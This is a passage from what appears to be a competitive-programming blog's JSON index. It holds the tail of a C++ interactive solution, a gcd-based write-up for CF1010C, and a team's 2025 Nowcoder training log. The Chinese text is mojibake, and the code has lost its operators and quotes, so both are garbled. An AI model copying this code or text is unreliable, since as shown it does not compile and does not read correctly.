0) return query (lst); else if (sure == 1) reverse (lst.begin (),lst.end ()); return query (lst); for (int i = r;i = l;--i) lst.push_back (i); if (!query (lst)) return false; for (int i = l;i = r;++i) lst.pop_back (); if (query (lst)) sure = 0; else sure = 1; return true; ; while (1) if (l + 1 == r) if (sure == -1) if (query (l,r)) L = l,R = r; else L = r,R = l; else if (sure == 0) L = l,R = r; else L = r,R = l; break; int mid = (l + r) 1; if (check (l,mid)) r = mid; else l = mid; ans[L] = (;ans[R] = ); vector int p; for (int i = 1;i = n;++i) if (i != L i != R) p.push_back (i); int pos = 0,sz = p.size (); while (pos sz) vector int nw (UP,L); for (int i = 0;i UP;++i) if (pos + i sz) nw[i] = p[pos + i]; vector int lst; for (int i = 0;i UP;++i) for (int j = 0;j dig[i];++j) lst.push_back (L),lst.push_back (nw[i]); lst.push_back (L); int res = query (lst); for (int i = UP - 1;~i;--i) if (nw[i] == L) continue; if (res = (1 + dig[i]) * dig[i] / 2) ans[nw[i]] = ),res -= (1 + dig[i]) * dig[i] / 2; else ans[nw[i]] = (; pos += UP; printf (! ); for (int i = 1;i = n;++i) printf (%c,ans[i]); puts ();fflush (stdout);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1010C Border","path":"/2025/07/27/CF1010C/","content":"å½¢å¼åŒ–ä¸€ä¸‹é¢˜æ„ï¼Œå°±æ˜¯æ±‚ä½¿å¾—ä¸‹å¼æˆç«‹çš„ $r$ çš„ä¸ªæ•°ã€‚ a_1x_1 + a_2x_2 + \\cdots + a_nx_n = pk + r (x_i,p,r \\ge 0)æŠŠ $r$ çœ‹æˆå®šå€¼ï¼Œç”±è£´èœ€å®šç†å¯çŸ¥ä¸Šå¼æœ‰è§£å½“ä¸”ä»…å½“ \\gcd(a_1,a_2,\\cdots,a_n) \\mid pk + rè£´èœ€å®šç†å¯ä»¥æ¨å¹¿åˆ° $n$ ä¸ªæ•´æ•°çš„æƒ…å½¢: è®¾ $a_1, a_2, \\cdots, a_n$ æ˜¯ä¸å…¨ä¸ºé›¶çš„æ•´æ•°ï¼Œåˆ™å­˜åœ¨æ•´æ•°$x_1, x_2, \\cdots, x_n$ ä½¿å¾— $a_1x_1 + a_2x_2 + \\cdots + a_nx_n = \\gcd(a_1, a_2, \\cdots, a_n)$ã€‚ å…¶é€†å®šç†ä¹Ÿæˆç«‹: è®¾ $a_1, a_2, \\cdots, a_n$ æ˜¯ä¸å…¨ä¸ºé›¶çš„æ•´æ•°ï¼Œ$d 0$ æ˜¯ $a_1, a_2, \\cdots, a_n$ çš„å…¬çº¦æ•°ï¼Œè‹¥å­˜åœ¨æ•´æ•° $x_1, x_2, \\cdots, x_n$ ä½¿ $a_1x_1 + a_2x_2 + \\cdots + a_nx_n = d$ï¼Œåˆ™ $d = \\gcd(a_1, a_2, \\cdots, a_n)$ã€‚::: è®¾ $g = \\gcd(a_1,a_2,\\cdots,a_n)$ï¼Œåˆ™å¯ä»¥æ”¹å†™æˆ tg = pk + rå…¶ä¸­ $g,k,r$ ä¸ºå®šå€¼ï¼Œå› æ­¤ç§»é¡¹å¯å¾— gt - kp = rå®¹æ˜“å‘ç°è¿™å°±æ˜¯ $ax + by = c$ çš„å˜å¼ï¼Œæœ‰è§£å½“ä¸”ä»…å½“ \\gcd (g,-k) \\mid rå› æ­¤ç­”æ¡ˆä¸º $\\{\\gcd(g,-k) \\times 0,\\gcd(g,-k) \\times 1,\\cdots,\\gcd(g,-k) \\times (m - 1)\\}$ï¼Œå…¶ä¸­ $m = \\lfloor\\dfrac{k}{\\gcd(g,-k)}\\rfloor$ã€‚æ³¨æ„æ­¤å¤„çš„ $\\gcd$ å‡ä¸ºæ­£æ•°ï¼Œå¯ä»¥åœ¨è®¡ç®—æ—¶ç›´æ¥å»æ‰è´Ÿå·ã€‚ void solve () int n = read (),k = read (),g = 0; vector int a (n + 1); for (int i = 1;i = n;++i) a[i] = read (),g = __gcd (a[i],g); int tot = k / __gcd (g,k); printf (%d ,tot); for (int i = 0;i tot;++i) printf (%d ,i * __gcd (g,k)); puts ();","categories":["Solution"]},{"title":"2025 ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè®°å½•","path":"/2025/07/01/Nowcoder25/","content":"ç›®å½• 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥1 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥2 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥3 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥4 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥5 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥6 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥7 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥8 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥9 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥10 åè®° 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥1 ã€çœæµç‰ˆã€‘I é¢˜æ˜¯æ­£è§£å´è¢«å¡å¸¸çš„ï¼ŒH æ˜¯æ¯”èµ›ç»“æŸå 2s ä»¥åè¿‡çš„â€¦â€¦ ã€Zlwã€‘ä¸Šæ¥å…ˆå¼€å§‹çœ‹ Eï¼Œçœ‹åˆ°å¹³æ–¹å·®æƒ³åˆ°åŒ–æˆ $(a+b)(a-b)$ ï¼Œä½†æ˜¯ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è´¨æ•°ä¸åˆæ³•ã€‚ä¸è¿‡åé¢ç»†æƒ³ä¸€ä¸‹å‘ç°åˆ†å¥‡å¶è€ƒè™‘ï¼Œ$(a+b),(a-b)$ å¥‡å¶æ€§è¦ç›¸åŒï¼Œç„¶åå°±èƒ½å¾—åˆ°ç­”æ¡ˆäº†ã€‚ ã€Scyã€‘G é¢˜é¢˜æ„æœ‰ç‚¹è¿·æƒ‘ï¼Œçœ‹äº†ä¸€éä»ç„¶æ²¡æ‡‚ï¼Œäºæ˜¯è®© zlw å…ˆå¼€å§‹æ•²é¢˜ï¼Œè¶ç€ä»–å¡ä½äº†ä¸€ä¸‹çš„é—´éš™ç­¾åˆ°å®Œæ¯•ã€‚ ã€*ã€‘å‰ä¸¤é¢˜åœ¨ 16/18 min çš„æ—¶å€™é€šè¿‡ã€‚ ã€Zlwã€‘æ¥ç€å¼€äº† Lã€‚å‘ç°æ»¡è¶³æ¡ä»¶çš„ $a_i$ å¤§è‡´æ˜¯å°äºä¸­ä½æ•°ã€‚ç¨å¾®ç»†æƒ³å¯ä»¥å‘ç°æ˜¯ä¸¥æ ¼å°äº $a_{ä¸­ä½+1}$ ã€‚äºæ˜¯å¥—ç‚¹æ•°æ®ç»“æ„å°±å¯ä»¥å• $\\log$ äº†ï¼Œä¸è¿‡ä¸€å¼€å§‹æ²¡æƒ³ç¦»æ•£æ ‘çŠ¶æ•°ç»„è¢«å­™âœŒæ€’éª‚ä¸€é€šï¼Œåé¢æƒ³æƒ³è™½ç„¶ç¦»æ•£åŒ–éº»çƒ¦æ€»å½’æ²¡æœ‰å¹³è¡¡æ ‘éº»çƒ¦ã€‚è¿˜å¥½å†™äº†ç¦»æ•£åŒ–ï¼Œæ®è¯´å¹³è¡¡æ ‘è¢«å¡å¸¸äº†ã€‚ ã€*ã€‘ä½†æ˜¯ L çˆ† int æ²¡æœ‰å‘ç°æµªè´¹äº†ä¸€ç‚¹æ—¶é—´ï¼Œ1h å¤šä¸€ç‚¹ $-1$ é€šè¿‡ Lï¼Œä¹‹å zlw å’Œ sky çœ‹äº† K é¢˜ï¼Œscy å¼€å§‹ Dã€‚D é¢˜åº”è¯¥æ˜¯æƒ³åˆ°ç¬¬ä¸€æ­¥å¤§ä¸æ ¹å·çš„è´¨æ•°å¹‚æ¬¡ä¸º $1$ï¼Œä½†æ˜¯å‘ç°ä¸å¤ªä¼šé«˜çº§ç­›æ³•ï¼ŒåŠ ä¸Šçœ‹æ¦œæäº¤æ•°é‡è¿‡ç™¾ä½†æ— äººé€šè¿‡ï¼Œäºæ˜¯æ”¾å¼ƒäº†è¿™é¢˜ã€‚å¤§æ¦‚ç©ºæœºäº† 15 minï¼Œsky è¯´å¤§è‡´ä¼š Kï¼Œäºæ˜¯å¼€å§‹å†™ã€‚ ã€Skyã€‘é¢˜ç›®å¤§æ„å°±æ˜¯æœ‰ä¸€ä¸ªèŠ‚ç‚¹æ•°ä¸º $n$ çš„æ— å‘å›¾ï¼Œä½†æ¯ä¸ªç‚¹çš„åº¦æ•°æœ€å¤§ä¸º $3$ï¼Œè€Œä¸”ç»™å®šäº†éå†å›¾æ—¶çš„èµ°æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºå›ºå®šè·¯çº¿ã€‚è¦æ±‚ä»èŠ‚ç‚¹ $i$ å‡ºå‘èƒ½èµ°åˆ°çš„æœ€å¤šè¾¹æ•°ã€‚ ä¸€å¼€å§‹æˆ‘ç†è§£ä¸ºçº¿è·¯å¯èƒ½æ˜¯é“¾åŠ ç¯çš„å½¢å¼ï¼Œæƒ³äº†åŠå¤©æ€ä¹ˆåšè¿™ä¸ªè®°å¿†åŒ–æœç´¢ï¼Œä½†ç»è¿‡è®¨è®ºåå‘ç°ä»»ä½•ä¸€ä¸ªçº¿è·¯éƒ½ä¸€å®šæ˜¯ç¯ï¼Œå› ä¸ºé¢˜ç›®ç»™äº†â€œæ‰€æœ‰èµ°å»Šéƒ½æ˜¯åŒå‘çš„ï¼Œå› æ­¤å¦‚æœä»æˆ¿é—´ $u$ åˆ°æˆ¿é—´ $u$ æœ‰ä¸€æ‰‡é—¨ï¼Œé‚£ä¹ˆä»æˆ¿é—´ $v$ åˆ°æˆ¿é—´ $u$ ä¹Ÿæœ‰ä¸€æ‰‡é—¨â€ï¼Œç„¶åå°±å¥½åšå¾ˆå¤šäº†ï¼Œåªéœ€è¦éå†è¿™ä¸ªå›ºå®šè·¯çº¿ï¼Œå‘ç°ç¯ä¹‹åæŠŠç¯ä¸Šçš„æ‰€æœ‰ç‚¹çš„è¿™ä¸ªè·¯çº¿çŠ¶æ€éƒ½æ›´æ–°ç­”æ¡ˆä¸ºç¯çš„è¾¹çš„æ•°é‡å³å¯ï¼Œç„¶åè®°å¿†åŒ–ï¼Œæ€»å¤æ‚åº¦ $O(n)$ã€‚ è¿™ä¸ªè·¯çº¿çŠ¶æ€å¯ä»¥ç†è§£ä¸ºï¼Œç‚¹ $u$ å‘å®ƒçš„æŸä¸ªèŠ‚ç‚¹çš„è¾¹ï¼Œå› ä¸ºåŒä¸€ä¸ªç‚¹å¯èƒ½åœ¨ä¸åŒçš„çº¿è·¯ç¯é‡Œï¼Œä½†æ˜¯ä¸€ä¸ªè¾¹ä¸€å®šåªè¢«ä¸€ä¸ªç¯åŒ…å«ã€‚ ã€*ã€‘è¿™é“é¢˜ä¼¼ä¹èµ°å¼¯è·¯èµ°çš„æŒºä¹…ï¼Œå†™äº†å°†è¿‘ä¸¤å°æ—¶ï¼Œè¿˜ TLE äº†ä¸€å‘ã€‚Sky åœ¨å†™è¿™é¢˜çš„æ—¶å€™ Scy å’Œ Zlw è®¨è®ºäº†ä¸€ä¸‹ Hï¼Œç„¶å Scy ç‹¬è‡ªå¼€äº† I å¹¶è®¤ä¸ºå¾—åˆ°äº†æ­£è§£ï¼Œå¹¶å’Œ zlw è¿›è¡Œäº†ä¸¤æ¬¡ç¡®è®¤ã€‚Sky åœ¨å†™äº† 1.5 h çš„æ—¶å€™é‡åˆ°é—®é¢˜æ‰è¿›ä¸€æ­¥å’Œæˆ‘ä»¬è®¨è®ºï¼Œå†å‘ç°ç‰¹æ®Šæ€§è´¨ä»¥å 20 min ä¸åˆ°é€šè¿‡äº†è¿™é¢˜ã€‚æ„Ÿè§‰è¿™é¢˜è€—æ—¶è¿‡ä¹…çš„åŸå› å‡ºåœ¨å‰æœŸè€ƒè™‘ä¸å……è¶³ï¼Œç„¶åé‡åˆ°é—®é¢˜æ²¡æœ‰å³æ—¶çš„è®¨è®ºã€‚ä¸è¿‡å¥½åœ¨ä»ç„¶æœ‰å¤šçº¿ä½œæˆ˜ã€‚ ã€Scyã€‘è¿‡äº† 3 h çš„æ—¶å€™å¼€å§‹å†™ Iï¼Œå·®ä¸å¤š 40 min å†™å®Œï¼Œä¸€ä¸ª $O(n^3 \\log n)$ çš„åŒºé—´ dp åŠ ä¸ŠäºŒåˆ†ä¼˜åŒ–ã€‚ä½†æ˜¯æäº¤åœ¨ 4s æ—¶é™çš„æƒ…å†µä¸‹ä¾æ—§è¶…æ—¶ï¼Œæ„è¯†åˆ°è¢«å¡å¸¸åå’Œé˜Ÿå‹äº¤æµå°è¯•å¤šæ¬¡ä¿®æ”¹ï¼Œä½†æ˜¯æ— æœï¼ŒæŠ˜è…¾äº†å¿«ä¸€ä¸ªå°æ—¶ä»ç„¶æ²¡æœ‰é€šè¿‡ã€‚ ã€*ã€‘ I è¿™ä¸ªå¡å¸¸å®åœ¨æ˜¯æœ‰ç‚¹æ— è¯­ï¼ˆä¸€æ–¹é¢å¯èƒ½ç‰›å®¢çš„è¯„æµ‹æœºç¡®å®æœ‰ç‚¹æ…¢äº†ï¼Œç¬¬ä¸€å‘æäº¤æµ‹äº†å¥½å‡ åˆ†é’Ÿæ‰è¿”å› TLEï¼Œä¼°è®¡ä¹Ÿæ˜¯é åçš„å‡ ä¸ªç‚¹ï¼‰ã€‚èµ›åéšä¾¿ä¹±æ”¹ï¼Œåˆ æ‰äº†ä¸€ä¸ª $O(n)$ çš„å¾ªç¯åè€Œè¿‡äº†ï¼ˆ$n = 420$ï¼‰ã€‚ ã€Zlwã€‘H æ˜¯å¾ˆå¿«å°±æœ‰äººé€šè¿‡çš„é¢˜ï¼Œä½†æ˜¯æ®è¯´é¦–å‘æ˜¯æš´åŠ›å¹²è¿‡å»çš„ã€‚ ç¬¬ä¸€çœ¼çœ‹æ²¡è¯»æ‡‚é¢˜ï¼Œå­™âœŒä¸­è¯‘ä¸­äº†ä¸€ä¸‹ä»ç„¶ä¸æ˜¯å¾ˆæ‡‚ï¼Œæœ€ç»ˆèŠ±è´¹å¤§é‡æ—¶é—´çœ‹å®Œé¢˜ç›®ã€‚ç„¶åå­™âœŒæå‡ºäº†å¯ä»¥æŒ‰ç…§è¿ç»­ç›¸ç­‰çš„æ®µï¼Œç„¶åè®¡ç®— $\\sum \\binom{|s|}{2}$ çš„æ–¹å¼å¾—åˆ°ç»“æœã€‚ç»“åˆå¥‡ç‰¹çš„æ—¶é—´å¤æ‚åº¦è¦æ±‚æƒ³åˆ°äº† bitsetï¼Œä½†æ˜¯å‘ç°è¦æ‰‹å†™ï¼Œæ²¡å†™è¿‡ï¼Œé‚æŠ„æ¿å­ã€‚ è¿˜å¾—æŠŠ unsigned long long åˆ†æˆ $4$ æ®µå¤„ç†ï¼Œçœ‹ç€å¾ˆå¤æ‚ï¼Œé‚æ²¡æ•¢å†™ã€‚é˜Ÿå‹å†™é¢˜çš„æ—¶å€™æƒ³äº†ä¸€ä¸‹ï¼Œå‘ç° $1$ æ“ä½œå¯ä»¥å°†å·®åˆ†æ“ä½œå»¶è¿Ÿå¤„ç†ï¼Œç„¶åå¤„ç† $[0,65535]$ æ¯ä¸ªæ•°åšå‰ç¼€å’Œä¹‹åçš„ç»“æœï¼Œä»¥åŠå‰åç¼€ $0$ ä¸ªæ•°ã€ä¸­é—´çš„å¯¹ç­”æ¡ˆçš„è´¡çŒ®ï¼Œç„¶åæ ¹æ®ä¸Šè¿°è¯´çš„æ¯ä¸ª ull æ‹†æˆ $4$ ä»½åˆå¹¶ã€‚æœ€å 1h å¼€å†™ï¼ŒæŒ‚äº†ä¸€ç‚¹ç‚¹ï¼ŒæŸ¥å‡ºé”™å†äº¤ï¼Œåˆåˆ äº†ä¸€ä¼šè°ƒè¯•ï¼Œèµ›å 2s è¿‡é¢˜QAQã€‚ ã€*ã€‘è¯´å®åœ¨ I çš„å¡å¸¸ç¡®å®æœ‰ç‚¹çº¢æ¸©äº†ï¼Œè¿˜æ—¶ä¸æ—¶åœ°æŠ¢äº† Zlw çš„æœºä½ï¼Œå¯¼è‡´ä»–æœ€åå‡ åˆ†é’Ÿæ‰å¼€å§‹æäº¤ï¼Œç„¶åå‘ç°é”™è¯¯çš„æ—¶å€™æ˜¯ 59 åˆ†ï¼Œåˆ å®Œæ³¨é‡Šæäº¤å‘ç°å·²ç» too late äº†ã€‚ ã€Scyã€‘çœ‹é¢˜è§£çš„æ—¶å€™æ‰å‘ç° B æ˜¯å’Œ H,I ä¸€ä¸ªéš¾åº¦çš„ï¼Œæ˜¯æ„é€ é¢˜ï¼Œæˆ‘å¯èƒ½ä¼šæ›´æ“…é•¿è¿™ä¸€ç±»é¢˜ç›®ï¼Œå¯ä»¥ç”±äºèµ›æ—¶é€šè¿‡äººæ•°ä¸å¤šï¼Œå¹¶æœªå‘ç°è¿™é“é¢˜ç›®ã€‚ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥2 ã€çœæµç‰ˆã€‘å­™è€æ¿åœ¨ç¬¬ä¸€æ¬¡èµ›åå¤ç›˜æ—¶æœ‰è¨€ï¼šå¯¹ä½ ä»¬æ¥è¯´ç›®å‰åˆé€‚çš„ timeline æ˜¯ï¼š$\\texttt{1h}$ $3$ é¢˜ï¼Œ$\\texttt{3h}$ $5$ é¢˜ï¼Œ$\\texttt{5h}$ ä¿ $6$ å†² $7$ã€‚ äºæ˜¯ä¹ï¼š åœ¨ $4:52$ æ—¶é€šè¿‡ $7$ é¢˜å¹¶ä¸‹ç­ï¼Œä¸é¢„è¨€å®Œç¾çš„å¥‘åˆèµ·æ¥ï¼ï¼ˆæ‰€ä»¥è¯´å­™è€æ¿è¯´æˆ‘ä»¬èƒ½ AKï¼Œæ˜¯ä¸æ˜¯å°±èƒ½ AK å‘¢ï¼‰ ã€Zlw Sky Scyã€‘Zlw ä¸€å¼€å§‹åœ¨çœ‹ Aï¼ŒScy å’Œ Sky åœ¨è®¨è®º Iï¼Œä½†æ˜¯ Zlw æ²¡æ€ä¹ˆè¯»æ‡‚ A é¢˜ï¼Œäºæ˜¯åŠ å…¥äº† I çš„è®¨è®ºã€‚I ç¡®å®æ˜¯ç­¾åˆ°ï¼Œä½†ï¼ˆç”±äº Scy è¿˜åœ¨ç…®æ°´é¥ºåƒï¼‰ç¨ç¨æƒ³æ­ªäº†ä¸€ç‚¹ï¼Œæƒ³è¦å¼€å§‹å¤§åŠ›åˆ†ç±»è®¨è®ºã€‚Sky ä¸€å¼€å§‹è€ƒè™‘å˜å½¢ $(x-y) \\bmod k = (k \\bmod y) - (k \\bmod x)$ï¼Œå‘ç° $k=x-y$ è²Œä¼¼æœ‰ä»€ä¹ˆæ€§è´¨ã€‚ä½†åšäº†ä¸€ä¼šä¹‹åï¼ŒScy å‘ç°ç›´æ¥ $k=1$ å°±å¯ä»¥äº†ï¼Œå¿«é€Ÿå†™ï¼Œæ‰“äº†ä¸ªè¡¨éªŒè¯ä¹‹åå°±äº¤ä¸Šå» AC äº†ã€‚ ã€Zlwã€‘ç„¶åå›å»çœ‹ Aï¼Œè·Ÿ Sky ç¡®è®¤äº†é¢˜æ„ï¼Œå‘ç°åªéœ€è¦ç»Ÿè®¡ $1$ çš„è¿ç»­æ®µæ•°ï¼Œè¢«å¥‡ç‰¹çš„æ ·ä¾‹è§£é‡Šå¡ä½äº†ã€‚ç„¶åå‘ç°æ˜¯ä¸ªå…¸å‹ dpï¼Œå¾ˆå¿«å†™å®Œã€‚ ã€Scy Skyã€‘Zlw åœ¨å†™ A çš„æ—¶å€™ Scy å»çœ‹äº† Bã€‚å¸å–äº†ä¸Šä¸€æ¬¡çš„æ•™è®­ï¼Œç­‰ Zlw å¼€å§‹ä¸Šæœºçš„æ—¶å€™æ‹‰æ¥ Sky ç¡®è®¤äº†åšæ³•ã€‚å¦‚æœèƒ½æ‰¾åˆ° $a_i a_i \\oplus a_j$æˆ–è€…æ˜¯ $a_j a_i \\oplus a_j$ ï¼Œå°±èƒ½æ»¡è¶³è¿™ä¸ªä¸ç­‰å¼ã€‚ç„¶å Sky å‘ç°ä¸€ç§å¾ˆç®€å•çš„ä¾‹å­å°±æ˜¯ $a_i$ å’Œ $a_j$ æœ‰ç€ç›¸åŒçš„æœ€é«˜ä½çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯ $2^k \\leq a_i, a_j 2^{k+1}$ ä¸€å®šæ˜¯èƒ½æ»¡è¶³è¿™ä¸ªä¸ç­‰å¼çš„ã€‚Scy è¿›ä¸€æ­¥å‘ç°è¿™é“é¢˜éå¸¸è¯ˆéª—ï¼Œæ ¹æ®é¹Šå·¢åŸç† $n 64$ çš„æ—¶å€™éƒ½æ˜¯ Noï¼Œå…¶ä½™æš´åŠ›ã€‚å†™å®Œç›´æ¥äº¤äº†ï¼Œç»“æœ WAã€‚ã€‚Zlw åœ¨åˆ‡äº† A ä¹‹åæ¥çœ‹è¿™é“é¢˜ï¼Œæ€’å–· Scy è¿™ä¸ª fwï¼Œ $a_i \\le 10^{18}$ è¿˜åœ¨ç”¨ä½è¿ç®—æ¨¡æ‹Ÿï¼ˆåäº†è¢« $a_i$ çš„äºŒè¿›åˆ¶å’Œ $2^{a_i}$ ææ™•äº†ï¼‰ã€‚äºæ˜¯ Zlw æå‡ºäº†ä¸ç­‰å¼ $2^x \\leq 2^x+2^y \\leq 2^{x+1} (x\\geq y)$ åˆå› ä¸º $x \\oplus y$ ä¸€å®šæ˜¯æ•´æ•°ï¼Œå³è¦ä¹ˆå°äºç­‰äº $x$ï¼Œè¦ä¹ˆå¤§äºç­‰äº $x+1$ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å­æŠŠåº•æ•° $2$ ç›´æ¥æ¶ˆæ‰ï¼Œè¿›è€Œæ¯”è¾ƒ $x$ å’Œ $x \\oplus y$ å³å¯ä¾¿åœ¨ $00:57$ çš„æ—¶å€™é€šè¿‡äº†è¿™é¢˜ã€‚ ã€Zlwã€‘ç„¶åå»çœ‹ Fã€‚ä½†æ˜¯çœ‹é”™é¢˜äº†ï¼Œæ²¡çœ‹åˆ°â€œåªèƒ½æ“ä½œä¸€æ¬¡â€ï¼ŒScy è¯»å®Œé¢˜å‘ç°åªèƒ½æ“ä½œä¸€æ¬¡ï¼Œç„¶åä¸€èµ·è®¨è®ºå‘ç°ç›´æ¥è´ªå¿ƒé€‰æ‹©æœ€å¤§çš„ $0$ è¿ç»­æ®µå³å¯ã€‚å‰©ä¸‹çš„ä¹Ÿå¯ä»¥åªç”¨ä¸€ä¸ª $f$(è¿ç»­æ®µé•¿åº¦)å»è¡¨ç¤ºï¼Œä¸ç”¨å†™ç‰¹åˆ«å¤šçš„æ¨¡æ‹Ÿï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´åœ¨è¯»é¢˜ä¸Šã€‚ ã€*ã€‘F å†™å®Œä»¥å WA äº†ä¸€å‘ï¼ŒåŸå› æ˜¯ vector ä¸ºç©ºçš„æ—¶å€™æ²¡æœ‰åšä¿æŠ¤æªæ–½ï¼Œä»ç„¶ä¼šæœ‰å–é‡Œé¢å…ƒç´ çš„æƒ…å†µã€‚Zlw å†™å®Œä»¥å Scy å¤§è‡´æµ‹äº†å‡ ä¸ªé¢å¤–çš„æ ·ä¾‹ï¼Œä½†æ˜¯æ²¡æœ‰å¤ªæ³¨æ„åˆ°è¿™ç§ corner caseã€‚ ã€*ã€‘Zlw å†™ F çš„æ—¶å€™ï¼ŒScy å»çœ‹äº†è®¡ç®—å‡ ä½• Gï¼ŒSky çœ‹äº†å›¾è®º Lã€‚ ã€Zlw Skyã€‘è¿™é“é¢˜é¢˜æ„æ¯”è¾ƒå¤æ‚ï¼Œä½†å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„è®¡æ•°é—®é¢˜ã€‚ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å…¨æ˜¯ç¯ï¼Œä¸­é—´å‡ºç°äº†åå¤æ¨ªè·³çš„ç¡®è®¤ã€‚å†ç»†è¯»äº†é¢˜ç›®çš„ Input ä¿è¯å¦‚æœ $i eq j$ï¼Œåˆ™ $a_i eq a_j$ï¼Œç„¶åé¢˜ç›®åˆè¯´äº†æ¯ä¸ªäººä¸€å®šçˆ±ç€ä¸€ä¸ªäººï¼Œä¸ç®¡æ˜¯è‡ªå·±è¿˜æ˜¯åˆ«äººä¹‹åï¼Œç»ˆäºç¡®å®šäº†è¿™ä¸ªå…³ç³»ä¸€å®šæ˜¯ç”±å‡ ä¸ªåˆ†å¼€çš„ç¯ç»„æˆçš„ï¼ˆåŒ…æ‹¬è‡ªç¯ï¼‰ã€‚ ç¡®å®šä¹‹åå°±æ˜¯ç®€å•çš„åˆ†ç¯çš„èŠ‚ç‚¹æ•°é‡çš„å¥‡å¶æ€§è®¨è®ºå°±å¥½äº†ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤ç§å¤§æƒ…å†µï¼š æœ‰ä¸¤ä¸ªå¥‡æ•°å¤§å°çš„ç¯ï¼Œé‚£ä¹ˆè¢«ç¦æ­¢ç»“å©šçš„äººä¸€å®šåœ¨è¿™ä¸¤ä¸ªå¥‡æ•°ç¯é‡Œé¢ï¼Œè¿™ä¸¤ä¸ªå¯¹æ–¹æ¡ˆæ•°çš„è´¡çŒ®å°±æ˜¯ä¸¤ä¸ªç¯å¤§å°ç›´æ¥ç›¸ä¹˜ã€‚ å…¨æ˜¯å¶æ•°å¤§å°çš„ç¯ï¼Œé‚£ä¹ˆä¸¤ä¸ªè¢«ç¦æ­¢ç»“å©šçš„äººä¸€å®šåœ¨åŒä¸€ä¸ªç¯é‡Œï¼Œåˆ†ç¯èŠ‚ç‚¹çš„å¥‡å¶ä½ç½®ç¨å¾®è®¨è®ºä¸€ä¸‹å°±å¥½äº†ã€‚ å¯¹äºæ™®é€šçš„å¶æ•°ç¯ï¼Œ$\\lvert V \\rvert = 2$ çš„æ—¶å€™è´¡çŒ®ä¸º $1$ï¼Œ$\\lvert V \\rvert \\geq 4$ çš„æ—¶å€™åšçš„è´¡çŒ®ä¸º$2$ã€‚æœ€åæŠŠè¿™å‡ ä¸ªè´¡çŒ®ä¹˜èµ·æ¥å°±å¥½äº†ã€‚å¦‚æœå‡ºç°äº†ä¸æ˜¯ä¸Šé¢ä¸¤ç§æƒ…å†µçš„ï¼Œç›´æ¥è¾“å‡º $0$ã€‚è·Ÿ Zlw ç¡®è®¤äº†ä¸€ä¸‹ä¹‹åï¼ŒZlw å°±ç›´æ¥å†™äº†ï¼Œå¾ˆå¿«A Cã€‚ ã€Scyã€‘ $01:50$ ä»–ä¿©å†™å®Œ Lï¼Œæˆ‘èµ¶ç´§æ‰¾æ¥ Sky è®²äº†ä¸€éæˆ‘çš„åšæ³•ã€‚åˆ†ç±»è®¨è®ºç‚¹åœ¨å¤šè¾¹å½¢å†…è¿˜æ˜¯å¤–ã€‚åœ¨å¤–é¢ç­”æ¡ˆæ’ä¸º $2\\pi$ï¼Œåœ¨å†…éƒ¨ç­”æ¡ˆä¸ºè·ç¦»æœ€è¿œç‚¹ä¹‹é—´çš„æœ€å¤§è§’åº¦ã€‚Sky éªŒè¯äº†æˆ‘çš„åšæ³•ï¼Œäºæ˜¯å¼€å†™ã€‚å¾ˆå¿«å†™å®Œåæäº¤ï¼ŒWAã€‚Sky ç»™æˆ‘æä¾›äº†å‡ ä¸ª hack æ•°æ®ï¼Œå‘ç°å†™æŒ‚äº†ç‚¹çš„åœ°æ–¹ï¼Œæ”¹å®Œä»¥åä»ç„¶ WAã€‚äºæ˜¯å¼€å§‹çº¢æ¸©ï¼Œåæ¥æƒ³åˆ°å¯èƒ½æ˜¯ç²¾åº¦çš„é—®é¢˜ï¼Œä» acos() æ­é…å‰ä¹˜ç®—è§’åº¦æ”¹ä¸ºç›´æ¥ç”¨ atan2()ï¼Œä½†æ˜¯åˆç”±äºå¿˜è®°å˜æ¢äº†å‚è€ƒç³»ï¼Œä¸€å…± WA äº† $5$ å‘ï¼Œäº $03:47$ æ—¶å€™é€šè¿‡ã€‚ ã€Skyã€‘Zlw åœ¨å†™ L çš„æ—¶å€™ï¼ŒScy æ‰¾æˆ‘æ¥åšè¿™é“è®¡ç®—å‡ ä½•ï¼Œæˆ‘å½“æ—¶å°±æœ‰ç§ä¸å¥½çš„é¢„æ„Ÿï¼Œä½†è¿™é“é¢˜ç¡®å®æ˜¯ä¸‹ä¸€é“è¯¥åšçš„äº†ï¼Œä¹Ÿæ²¡åŠæ³•ã€‚è¿™é¢˜çš„æ­£è§£å®é™…ä¸Šå°±æƒ³äº†ä¸åˆ°ååˆ†é’Ÿï¼Œä½†æ˜¯å› ä¸ºå®ƒæ˜¯è®¡ç®—å‡ ä½•ï¼ŒåŠ ä¸Š $10^9$ 